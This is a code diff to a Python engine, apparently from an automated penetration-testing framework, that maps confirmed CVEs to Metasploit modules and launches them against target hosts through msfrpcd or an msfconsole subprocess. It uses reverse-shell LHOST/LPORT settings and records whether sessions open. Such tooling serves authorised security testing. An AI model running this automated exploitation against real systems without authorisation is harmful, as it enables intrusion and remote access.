@@ -167,10 +167,10 @@ class CVE2MSFEngine(BaseEngine):
         ports: list[dict[str, Any]] = kwargs.get("ports", [])
         lhost: str = kwargs.get("lhost", self._detect_lhost())
         lport: int = int(kwargs.get("lport", 4444))
+        msf_client = kwargs.get("msf_client", None)
         raw_lines: list[str] = []
         engine_findings: list[dict[str, Any]] = []
 
-        # Compatibilidad con calls desde exploit_dispatcher (single CVE)
         cve_id = kwargs.get("cve_id", "")
         services = kwargs.get("services", [])
         if cve_id and not confirmed_cves:
@@ -189,6 +189,8 @@ class CVE2MSFEngine(BaseEngine):
         port_map = self._build_port_map(ports, findings)
         raw_lines.append(f"[INFO] Processing {len(confirmed_cves)} confirmed CVEs")
         raw_lines.append(f"[INFO] LHOST={lhost} LPORT={lport}")
+        rpc_available = msf_client is not None
+        raw_lines.append(f"[INFO] RPC mode: {'ENABLED' if rpc_available else 'DISABLED (fallback subprocess)'}")
 
         for cve in confirmed_cves:
             cve_upper = cve.upper().strip()
@@ -208,17 +210,24 @@ class CVE2MSFEngine(BaseEngine):
             raw_lines.append(f"[EXPLOIT] {cve} -> {module_info['module']} on {cve_target}:{cve_port}")
             raw_lines.append(f"[EXPLOIT] {module_info.get('description', '')}")
 
-            rc_path = self._generate_rc_script(
-                cve=cve_upper, module=module_info["module"],
-                target=cve_target, port=cve_port,
-                lhost=lhost, lport=lport,
+            exploit_result = self._execute_via_msf(
+                cve=cve_upper,
+                module=module_info["module"],
+                target=cve_target,
+                port=cve_port,
+                lhost=lhost,
+                lport=lport,
                 payload=module_info.get("payload", ""),
+                msf_client=msf_client,
+                raw_lines=raw_lines,
             )
 
-            msf_output, session_id = self._run_msfconsole(rc_path, raw_lines)
-
+            session_id = exploit_result.get("session_id")
+            msf_output = exploit_result.get("output", "")
             exploit_failed = bool(_FAIL_PATTERN.search(msf_output))
-            exploit_success = session_id is not None or bool(_SUCCESS_PATTERN.search(msf_output))
+            exploit_success = session_id is not None or (
+                bool(_SUCCESS_PATTERN.search(msf_output)) and not exploit_failed
+            )
 
             finding: dict[str, Any] = {
                 "file_path": cve_target,
@@ -237,10 +246,10 @@ class CVE2MSFEngine(BaseEngine):
                 "cve_id": cve_upper,
                 "exploit_module": module_info["module"],
                 "exploit_target": f"{cve_target}:{cve_port}",
-                "rc_script": rc_path,
                 "session_id": session_id,
                 "access_gained": session_id is not None,
                 "msf_output": msf_output[:2000],
+                "exploit_source": exploit_result.get("source", "subprocess"),
             }
             engine_findings.append(finding)
 
@@ -254,6 +263,40 @@ class CVE2MSFEngine(BaseEngine):
             findings=engine_findings,
             summary=", ".join(summary_parts),
         )
+
+    def _execute_via_msf(
+        self,
+        cve: str, module: str, target: str, port: int,
+        lhost: str, lport: int, payload: str,
+        msf_client: Any, raw_lines: list[str],
+    ) -> dict[str, Any]:
+        if msf_client is not None:
+            try:
+                raw_lines.append(f"[RPC] Executing {module} via msfrpcd...")
+                result = msf_client.execute_module(
+                    module=module, rhosts=target, rport=port,
+                    payload=payload, lhost=lhost, lport=lport,
+                    timeout=120,
+                )
+                raw_lines.append(f"[RPC] Source: {result.get('source', 'rpc')}")
+                if result.get("session_id"):
+                    raw_lines.append(f"[RPC] Session #{result['session_id']} opened")
+                return result
+            except Exception as e:
+                raw_lines.append(f"[RPC] Error: {e}, falling back to subprocess")
+
+        raw_lines.append(f"[MSF] Executing {module} via msfconsole subprocess...")
+        rc_path = self._generate_rc_script(
+            cve=cve, module=module, target=target, port=port,
+            lhost=lhost, lport=lport, payload=payload,
+        )
+        msf_output, session_id = self._run_msfconsole(rc_path, raw_lines)
+        return {
+            "success": session_id is not None,
+            "session_id": session_id,
+            "output": msf_output,
+            "source": "subprocess",
+        }
 
     def _extract_cves_from_findings(self, findings: list[dict[str, Any]]) -> list[str]:
         cves: set[str] = set()
